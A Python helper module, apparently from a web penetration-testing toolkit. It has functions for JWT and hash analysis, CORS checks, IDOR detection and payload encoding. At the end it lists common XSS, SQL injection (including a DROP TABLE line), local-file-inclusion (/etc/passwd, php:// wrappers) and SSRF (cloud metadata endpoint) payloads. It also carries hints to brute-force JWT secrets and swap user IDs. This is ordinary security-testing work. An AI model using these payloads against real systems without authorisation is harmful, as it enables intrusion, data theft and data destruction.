"""Payload Encoding/Decoding, Analysis Tools, and Common Payloads"""
import base64
import urllib.parse
import html
import re
import json
import hashlib
from typing import Dict, Any, List

# ==================== JWT ANALYSIS ====================

def analyze_jwt(token: str) -> Dict[str, Any]:
    """Decode and analyze JWT token"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {"success": False, "error": "Invalid JWT format"}
        
        def decode_part(part):
            # Fix: Use -len(part) % 4 for correct base64 padding
            padding = -len(part) % 4
            part += "=" * padding
            return json.loads(base64.urlsafe_b64decode(part).decode())
        
        header = decode_part(parts[0])
        payload = decode_part(parts[1])
        
        # Security analysis
        issues = []
        if header.get("alg") == "none":
            issues.append("🚨 CRITICAL: Algorithm 'none' - signature bypass possible")
        if header.get("alg") in ["HS256", "HS384", "HS512"]:
            issues.append("⚠️ HMAC algorithm - try brute force secret key")
        if payload.get("exp") and payload["exp"] < __import__('time').time():
            issues.append("⏰ Token expired")
        if not payload.get("exp"):
            issues.append("⚠️ No expiration set")
        
        return {
            "success": True,
            "header": header,
            "payload": payload,
            "signature": parts[2][:20] + "...",
            "algorithm": header.get("alg"),
            "security_issues": issues
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

# ==================== HASH ANALYSIS ====================

HASH_PATTERNS = {
    32: ["MD5", "MD4", "MD2", "NTLM"],
    40: ["SHA1", "RIPEMD-160"],
    56: ["SHA224"],
    64: ["SHA256", "SHA3-256", "BLAKE2s"],
    96: ["SHA384", "SHA3-384"],
    128: ["SHA512", "SHA3-512", "BLAKE2b", "Whirlpool"],
}

def identify_hash(hash_str: str) -> Dict[str, Any]:
    """Identify hash type based on length and format"""
    hash_str = hash_str.strip().lower()
    
    # Check if valid hex
    if not re.match(r'^[a-f0-9]+$', hash_str):
        # Check base64
        try:
            decoded = base64.b64decode(hash_str)
            return {
                "success": True,
                "input": hash_str[:30] + "...",
                "format": "base64",
                "decoded_length": len(decoded),
                "possible_types": HASH_PATTERNS.get(len(decoded.hex()), ["Unknown"])
            }
        except:
            return {"success": False, "error": "Not a valid hash or base64"}
    
    length = len(hash_str)
    possible = HASH_PATTERNS.get(length, [])
    
    return {
        "success": True,
        "input": hash_str[:30] + "...",
        "length": length,
        "format": "hex",
        "possible_types": possible if possible else ["Unknown - uncommon length"],
        "crack_suggestion": "hashcat -m 0" if length == 32 else f"hashcat (check mode for {length} chars)"
    }

def generate_hashes(text: str) -> Dict[str, str]:
    """Generate common hashes for a string"""
    return {
        "md5": hashlib.md5(text.encode()).hexdigest(),
        "sha1": hashlib.sha1(text.encode()).hexdigest(),
        "sha256": hashlib.sha256(text.encode()).hexdigest(),
        "sha512": hashlib.sha512(text.encode()).hexdigest(),
    }

# ==================== CORS ANALYSIS ====================

def analyze_cors_headers(headers: Dict) -> Dict[str, Any]:
    """Analyze CORS configuration for vulnerabilities"""
    issues = []
    findings = {}
    
    acao = headers.get("Access-Control-Allow-Origin", headers.get("access-control-allow-origin"))
    acac = headers.get("Access-Control-Allow-Credentials", headers.get("access-control-allow-credentials"))
    
    findings["allow_origin"] = acao
    findings["allow_credentials"] = acac
    
    if acao == "*":
        issues.append("⚠️ Wildcard origin (*) - allows any domain")
        if acac and acac.lower() == "true":
            issues.append("🚨 CRITICAL: Wildcard + Credentials = Full CORS bypass!")
    
    if acao and acao != "*" and acac and acac.lower() == "true":
        issues.append(f"⚠️ Origin {acao} with credentials - test origin reflection")
    
    if not acao:
        findings["note"] = "No CORS headers - same-origin policy applies"
    
    return {
        "success": True,
        "findings": findings,
        "vulnerable": len([i for i in issues if "CRITICAL" in i]) > 0,
        "issues": issues
    }

# ==================== BUSINESS LOGIC HELPERS ====================

def compare_responses(resp1: Dict, resp2: Dict) -> Dict[str, Any]:
    """Compare two HTTP responses for differences"""
    diffs = []
    
    if resp1.get("status_code") != resp2.get("status_code"):
        diffs.append(f"Status: {resp1.get('status_code')} vs {resp2.get('status_code')}")
    
    if resp1.get("body_length", 0) != resp2.get("body_length", 0):
        diffs.append(f"Body length: {resp1.get('body_length')} vs {resp2.get('body_length')}")
    
    # Header differences
    h1 = set(resp1.get("headers", {}).keys())
    h2 = set(resp2.get("headers", {}).keys())
    if h1 != h2:
        diffs.append(f"Different headers: +{h2-h1} -{h1-h2}")
    
    return {
        "success": True,
        "identical": len(diffs) == 0,
        "differences": diffs,
        "similarity": 1.0 if len(diffs) == 0 else max(0, 1 - len(diffs) * 0.2)
    }

IDOR_PATTERNS = [
    ("Sequential ID", r'/(\d+)(?:/|$|\?)', "Try id±1, id±10, negative, 0"),
    ("UUID", r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "Try other user's UUID"),
    ("Base64 ID", r'[A-Za-z0-9+/]{20,}={0,2}', "Decode and modify"),
    ("Hash ID", r'[a-f0-9]{32}', "Try other MD5 hashes"),
]

def detect_idor_params(url: str) -> Dict[str, Any]:
    """Detect potential IDOR parameters in URL"""
    findings = []
    
    for name, pattern, suggestion in IDOR_PATTERNS:
        matches = re.findall(pattern, url, re.I)
        if matches:
            findings.append({
                "type": name,
                "matches": matches[:3],
                "suggestion": suggestion
            })
    
    # Query params
    if "?" in url:
        params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
        for key, values in params.items():
            if any(v.isdigit() for v in values):
                findings.append({
                    "type": "Numeric param",
                    "param": key,
                    "values": values,
                    "suggestion": "Try other user IDs"
                })
    
    return {
        "success": True,
        "url": url,
        "idor_candidates": findings,
        "risk": "HIGH" if findings else "LOW"
    }

# Common Payloads
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "javascript:alert(1)",
    '{{constructor.constructor("alert(1)")()}}',
]

SQLI_PAYLOADS = [
    "'", "''", "' OR '1'='1", "' OR '1'='1' --",
    "1' ORDER BY 1--", "1' UNION SELECT NULL--",
    "admin'--", "1; DROP TABLE users--",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
]

def encode_payload(payload: str, encoding: str) -> str:
    """Encode payload with various methods"""
    encodings = {
        "url": lambda p: urllib.parse.quote(p),
        "url_full": lambda p: urllib.parse.quote(p, safe=''),
        "double_url": lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
        "base64": lambda p: base64.b64encode(p.encode()).decode(),
        "html": lambda p: html.escape(p),
        "hex": lambda p: ''.join(f'%{ord(c):02x}' for c in p),
        "unicode": lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
    }
    return encodings.get(encoding, lambda p: p)(payload)

def decode_payload(payload: str, encoding: str) -> str:
    """Decode payload"""
    try:
        decodings = {
            "url": lambda p: urllib.parse.unquote(p),
            "base64": lambda p: base64.b64decode(p).decode(),
            "html": lambda p: html.unescape(p),
        }
        return decodings.get(encoding, lambda p: p)(payload)
    except:
        return payload
